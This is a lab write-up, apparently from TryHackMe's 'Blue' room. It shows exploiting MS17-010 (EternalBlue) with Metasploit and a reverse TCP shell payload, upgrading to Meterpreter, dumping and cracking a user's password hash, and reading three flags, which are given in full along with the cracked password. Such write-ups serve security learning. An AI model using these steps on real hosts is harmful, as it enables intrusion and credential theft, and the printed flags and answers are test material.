\subsubsection*{Blue}
\addcontentsline{toc}{subsubsection}{Blue}
\T{Recon}{
As with every machine, we begin with the reconaissance phase by performing an Nmap scan: 
\cdnl{nmap -v -sC -sV -O <IP>}
We see open ports at \cd{139, 445, 3389, 135, 49163, 49152, 49153, 49154}, so we have \textbf{3} ports with a port number under 1000.\\
On second thought, we better start the Metasploit console and run a \cd{db\_nmap} scan to save the results for later exploitation.\\
Maybe taking the hint of the module name, remembering the previous exploits of the module or seeing the smb share of the Nmap scan we take a look at eternalblue and run \cd{scanner/smb/smb\_ms17\_010}, getting as result that the host is likely vulnerable to \textbf{MS17-010}\\
\textbf{NOTE:} After finishing the room and looking at a walkthrough to check if I had missed anything, I learned the better Nmap scan: 
\cdnl{nmap -sC -sV -v --script vuln -oN blue.nmap <IP>}
This switch will check for all vulnerabilities in the Nmap database and hopefully give us the likelihood of the vulnerability ms17-010. I could not replicate it consistently, as the script execution failed, still giving us 12 possible vulnerabilities to check against, which eases the process enormously when tackling a black box.
}
\T{Gain Access}{
Knowing we will use Eternalblue against the target system, we search for the actual exploit:
\cdnl{exploit/windows/smb/ms17\_010\_eternalblue}
We \cd{show options} and see as necessary values \textbf{RHOSTS}, RPORT with default value 445, and other values set by default. We set the RHOSTS value and the LHOST parameter to our IP in the THM network.\\
We set the payload as intructed with \cd{set payload windows/x64/shell/reverse\_tcp} and are done to \cd{run} the exploit, seeing a Windows shell we are instructed to background with \cd{Ctrl+Z}.
}
\T{Escalate}{
In this task, we will upgrade the Windows shell we had to a Meterpreter shell where we will get all the features Metasploit can offer to be available. As instructed, a quick online search hints to \cd{search} for \cd{shell\_to\_meterpreter}, a post-exploitation module we find under \\
\textbf{\cd{post/multi/manage/shell\_to\_meterpreter}}.\\
We set the \textbf{SESSION} parameter to our backgrounded session and run the exploit to get the desired Meterpreter shell.\\
Once achieved, we want to verify our escalated shell is in \cd{NT AUTHORITY$\bsl$SYSTEM}. Note that we already had this under the previous Windows shell, but we wanted the resources Meterpreter provides us. This we can do by opening a dos shell with \cd{shell} and checking our identity with the standard command \cd{whoami}.\\
We list the processes via \cd{ps} and locate a very nicely \cd{NT AUTHORITY$\bsl$SYSTEM} based \cd{TrustedInstaller.exe} under PID 3064. After several unsuccessful attempts, we migrate it to process 1460, where \cd{LiteAgent.exe} was located. 
}
\T{Cracking}{
We dump all users and password hashes with \cd{hashdump} and see the users Administrator, Guest and the non-default user \textbf{Jon}.\\
We extract from the line
\cdnl{Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
}
the password hash \cd{ffb43f0de35be4d9917ac0cc8ad57f8d}.\\
We can crack it with \Crackstation and read the password \textbf{alqfna22}.
}
\T{Find flags}{
We are instructed to find three flags on the system, placed in relevant places within a standard Windows system according to the hints given:\\
\textbf{Hint 1:} This flag can be found at the system root:\\
Within a dos shell we go to the main drive, i.e \cd{C:/} and see the first flag: \cd{flag1.txt}. We print it with \cd{type flag1.txt} and see the flag:
\F{
flag\{access\_the\_machine\}
}
\textbf{Hint 2:} This flag can be found at the locations where passwords are stored within Windows.\\
We change directories to \cd{Windows/System32/config}, where the SAM directory is stored as well. There, we find the file \cd{flag2.txt} with the flag:
\F{
flag\{sam\_database\_elevated\_access\}
}
\textbf{Hint 3:} This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.\\
Back to the home directory \cd{C:$\bsl$}, we take a look at the Users in the system, finding only Jon. We take a look at his files and directories, finding only \cd{flag3.txt} in his Documents folder. We print its contents and see the last flag:
\F{
flag\{admin\_documents\_can\_be\_valuable\}
}
}
With this, we are done with the task, the module and the room, and can move on.